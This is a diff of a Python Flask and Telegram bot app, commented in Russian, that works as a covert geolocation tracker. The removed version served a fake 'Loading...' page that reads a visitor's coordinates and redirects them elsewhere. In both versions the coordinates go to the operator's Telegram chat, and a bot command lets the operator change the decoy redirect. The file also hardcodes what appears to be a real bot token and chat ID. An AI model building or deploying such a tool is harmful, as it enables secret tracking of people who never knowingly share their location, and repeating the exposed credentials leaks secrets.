@@ -1,116 +1,92 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, send_from_directory
 import requests
+from flask_cors import CORS
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import threading
 import os
-from flask_cors import CORS
-from telebot import types  # для кнопок
+
+app = Flask(__name__, static_folder='static')
+CORS(app)
 
 BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
-CHAT_ID = 651911888
-
-app = Flask(__name__)
-CORS(app)
+CHAT_ID = 651911888  # Только ты можешь пользоваться ботом
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-redirect_url = 'https://geo-tracker-l5ui.onrender.com'  # твой Render URL
+# Переменная для редиректа, можно менять через бота
+redirect_url = "https://example.com"  # Начальный URL редиректа
 
-# Для хранения состояния, ждём ли ввода нового редиректа
-waiting_for_redirect = set()
-
+# --- Функция для отправки координат в Telegram ---
 def send_to_telegram(lat, lon):
     text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": text}
-    try:
-        requests.post(url, data=data, timeout=5)
-    except Exception as e:
-        print(f"Ошибка отправки в Telegram: {e}")
+    bot.send_message(CHAT_ID, text)
 
+# --- Флask роуты ---
 @app.route('/')
 def serve_index():
-    global redirect_url
-    html = f'''
-    <!DOCTYPE html>
-    <html>
-    <head><title>Загрузка...</title></head>
-    <body>
-    <script>
-    navigator.geolocation.getCurrentPosition(pos => {{
-        fetch('/send_location', {{
-            method: 'POST',
-            headers: {{'Content-Type': 'application/json'}},
-            body: JSON.stringify({{
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-            }})
-        }});
-        setTimeout(() => {{
-            window.location.href = "{redirect_url}";
-        }}, 1500);
-    }}, err => {{
-        setTimeout(() => {{
-            window.location.href = "{redirect_url}";
-        }}, 1500);
-    }});
-    </script>
-    </body>
-    </html>
-    '''
-    return render_template_string(html)
+    return send_from_directory(app.static_folder, 'index.html')
 
-@app.route('/send_location', methods=['POST'])
+@app.route("/send_location", methods=["POST"])
 def send_location():
     data = request.json
-    lat = data.get('latitude')
-    lon = data.get('longitude')
+    lat = data.get("latitude")
+    lon = data.get("longitude")
     if lat and lon:
         send_to_telegram(lat, lon)
-        return {'status': 'ok'}
-    return {'status': 'error'}, 400
+        return {"status": "ok"}
+    return {"status": "error"}, 400
 
-@bot.message_handler(commands=['start', 'help'])
+# --- Telegram бот команды и кнопки ---
+
+def check_user(message):
+    # Проверяем, что пишет только владелец
+    return message.from_user.id == CHAT_ID
+
+@bot.message_handler(commands=['start'])
 def send_welcome(message):
-    if message.chat.id != CHAT_ID:
-        bot.reply_to(message, "❌ Доступ запрещен.")
+    if not check_user(message):
+        bot.reply_to(message, "🚫 Доступ запрещен.")
         return
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1 = types.KeyboardButton("Изменить редирект")
-    btn2 = types.KeyboardButton("Скинуть ссылку на Render")
-    markup.add(btn1, btn2)
-    bot.send_message(message.chat.id, "Привет! Выбери действие:", reply_markup=markup)
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("Изменить редирект", callback_data="change_redirect"))
+    markup.add(InlineKeyboardButton("Скинуть ссылку на Render", callback_data="send_link"))
+    bot.send_message(CHAT_ID, "Привет! Выбирай действие:", reply_markup=markup)
 
-@bot.message_handler(func=lambda message: message.text == "Изменить редирект")
-def change_redirect(message):
-    if message.chat.id != CHAT_ID:
-        bot.reply_to(message, "❌ Доступ запрещен.")
-        return
-    bot.send_message(message.chat.id, "Отправь новую ссылку (начинающуюся с http:// или https://):")
-    waiting_for_redirect.add(message.chat.id)
-
-@bot.message_handler(func=lambda message: message.chat.id in waiting_for_redirect)
-def receive_new_redirect(message):
+@bot.callback_query_handler(func=lambda call: True)
+def callback_inline(call):
     global redirect_url
-    if not (message.text.startswith('http://') or message.text.startswith('https://')):
-        bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://\nПопробуй ещё раз:")
-        return
-    redirect_url = message.text
-    bot.reply_to(message, f"✅ Редирект успешно изменён на:\n{redirect_url}")
-    waiting_for_redirect.remove(message.chat.id)
 
-@bot.message_handler(func=lambda message: message.text == "Скинуть ссылку на Render")
-def send_render_link(message):
-    if message.chat.id != CHAT_ID:
-        bot.reply_to(message, "❌ Доступ запрещен.")
+    if call.from_user.id != CHAT_ID:
+        bot.answer_callback_query(call.id, "🚫 Доступ запрещен.")
         return
-    bot.send_message(message.chat.id, f"Текущая ссылка на Render:\n{redirect_url}")
 
+    if call.data == "change_redirect":
+        msg = bot.send_message(CHAT_ID, "Введи новый URL для редиректа:")
+        bot.register_next_step_handler(msg, process_redirect_url)
+
+    elif call.data == "send_link":
+        bot.send_message(CHAT_ID, f"Вот твоя ссылка на Render:\n{redirect_url}")
+
+def process_redirect_url(message):
+    global redirect_url
+    if not check_user(message):
+        bot.reply_to(message, "🚫 Доступ запрещен.")
+        return
+    url = message.text.strip()
+    # Можно добавить проверку валидности URL, но для простоты — просто принимаем
+    redirect_url = url
+    bot.send_message(CHAT_ID, f"Редирект обновлен на:\n{redirect_url}")
+
+# --- Убираем webhook и запускаем polling ---
 def run_bot():
-    bot.remove_webhook()
+    bot.remove_webhook()  # Удаляем webhook, чтобы не было конфликта
     bot.infinity_polling()
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
+if __name__ == "__main__":
+    # Запускаем бота в отдельном потоке
     threading.Thread(target=run_bot, daemon=True).start()
-    app.run(host='0.0.0.0', port=port)
+
+    # Запускаем Flask сервер
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
